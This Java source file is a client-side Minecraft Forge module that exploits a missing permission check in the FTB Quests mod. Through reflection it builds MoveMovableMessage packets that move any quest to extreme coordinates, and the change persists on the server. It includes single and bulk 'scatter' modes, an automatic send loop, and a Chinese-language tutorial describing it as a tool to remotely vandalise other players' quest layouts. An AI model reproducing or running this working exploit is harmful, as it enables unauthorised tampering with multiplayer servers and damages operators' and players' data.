package com.redblue.red.modules.ftbquests;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import net.minecraft.client.Minecraft;
import net.minecraft.network.FriendlyByteBuf;
import net.minecraftforge.fml.ModList;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.util.List;

/**
 * FTQ-02: MoveMovableMessage has NO permission check.
 *
 * handle() directly calls movable.onMoved(x, y, chapterID) + markDirty()
 * without any NetUtils.canEdit() guard. Any player can move any quest
 * to arbitrary coordinates, persisted to disk.
 *
 * Wire format (from decode constructor):
 *   readLong(id) + readLong(chapterID) + readDouble(x) + readDouble(y)
 *
 * Attack: use reflection to construct via FriendlyByteBuf constructor,
 * or use the public constructor MoveMovableMessage(Movable, long, double, double).
 * Since Movable is an interface we don't have, we use the buf constructor.
 */
public class FTQ02_QuestMoveVandal implements AttackModule {

    private static final Logger LOG = LoggerFactory.getLogger("ModCompat");
    private static final String MSG_CLASS = "dev.ftb.mods.ftbquests.net.MoveMovableMessage";

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("mode", "模式", "SINGLE",
            "SINGLE", "SCATTER_ALL"),
        ConfigParam.ofString("quest_id", "任务ID(十六进制/十进制)", "")
            .visibleWhen("mode", "SINGLE"),
        ConfigParam.ofString("chapter_id", "目标章节ID(十六进制/十进制)", "")
            .visibleWhen("mode", "SINGLE"),
        ConfigParam.ofFloat("target_x", "目标X坐标", 99999f, -1e7f, 1e7f),
        ConfigParam.ofFloat("target_y", "目标Y坐标", 99999f, -1e7f, 1e7f),
        ConfigParam.ofInt("scatter_start", "散布起始ID", 1, 1, 99999)
            .visibleWhen("mode", "SCATTER_ALL"),
        ConfigParam.ofInt("scatter_count", "散布数量", 500, 1, 5000)
            .visibleWhen("mode", "SCATTER_ALL"),
        ConfigParam.ofInt("interval", "自动发包间隔(tick)", 5, 1, 200)
    );

    private long lastTick = 0;
    private int scatterIndex = 0;

    @Override public String id() { return "ftq02_quest_move_vandal"; }
    @Override public String name() { return "任务位置篡改"; }
    @Override public String description() { return "远程移动/破坏其他玩家的任务布局"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
             + "1. 从任务书同步数据中获取任务ID\n"
             + "2. 将目标坐标设置为极端值(如99999)\n"
             + "3. 点击执行或启用自动模式\n\n"
             + "[参数说明]\n"
             + "- 模式: SINGLE为移动单个任务, SCATTER_ALL为批量散布\n"
             + "- 任务ID: 目标任务的ID(支持十六进制/十进制)\n"
             + "- 目标章节ID: 移动到的目标章节\n"
             + "- 目标X/Y坐标: 移动到的坐标位置\n"
             + "- 散布起始ID/数量: 批量模式下的ID范围\n\n"
             + "[注意事项]\n"
             + "- 移动操作会持久化到磁盘\n"
             + "- SCATTER_ALL模式会尝试大量ID, 注意服务端负载";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("ftbquests");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        String mode = getParam("mode").map(ConfigParam::getString).orElse("SINGLE");
        if ("SINGLE".equals(mode)) {
            doSingleMove();
        } else {
            int start = getParam("scatter_start").map(ConfigParam::getInt).orElse(1);
            int count = getParam("scatter_count").map(ConfigParam::getInt).orElse(500);
            for (int i = 0; i < count; i++) {
                sendMovePacket(start + i, 0L,
                    getTargetX(), getTargetY());
            }
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(5);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        String mode = getParam("mode").map(ConfigParam::getString).orElse("SINGLE");
        if ("SINGLE".equals(mode)) {
            doSingleMove();
        } else {
            int start = getParam("scatter_start").map(ConfigParam::getInt).orElse(1);
            int count = getParam("scatter_count").map(ConfigParam::getInt).orElse(500);
            if (scatterIndex < count) {
                sendMovePacket(start + scatterIndex, 0L,
                    getTargetX(), getTargetY());
                scatterIndex++;
            }
        }
    }

    private void doSingleMove() {
        long questId = parseLongParam("quest_id");
        long chapterId = parseLongParam("chapter_id");
        if (questId == 0) return;
        sendMovePacket(questId, chapterId, getTargetX(), getTargetY());
    }

    private double getTargetX() {
        return getParam("target_x").map(ConfigParam::getFloat).orElse(99999f);
    }

    private double getTargetY() {
        return getParam("target_y").map(ConfigParam::getFloat).orElse(99999f);
    }

    private long parseLongParam(String key) {
        String val = getParam(key).map(ConfigParam::getString).orElse("0");
        try {
            if (val.startsWith("0x") || val.startsWith("0X")) {
                return Long.parseUnsignedLong(val.substring(2), 16);
            }
            return Long.parseLong(val);
        } catch (NumberFormatException e) {
            return 0L;
        }
    }

    private void sendMovePacket(long id, long chapterId, double x, double y) {
        try {
            // Use the FriendlyByteBuf constructor: MoveMovableMessage(FriendlyByteBuf)
            Class<?> clz = Class.forName(MSG_CLASS);
            Constructor<?> ctor = clz.getDeclaredConstructor(FriendlyByteBuf.class);
            ctor.setAccessible(true);

            FriendlyByteBuf buf = new FriendlyByteBuf(
                io.netty.buffer.Unpooled.buffer());
            buf.writeLong(id);
            buf.writeLong(chapterId);
            buf.writeDouble(x);
            buf.writeDouble(y);

            Object msg = ctor.newInstance(buf);
            buf.release();

            Method send = msg.getClass().getMethod("sendToServer");
            send.invoke(msg);
        } catch (Exception e) {
            LOG.error("[FTQ02] Failed to send MoveMovableMessage", e);
        }
    }
}
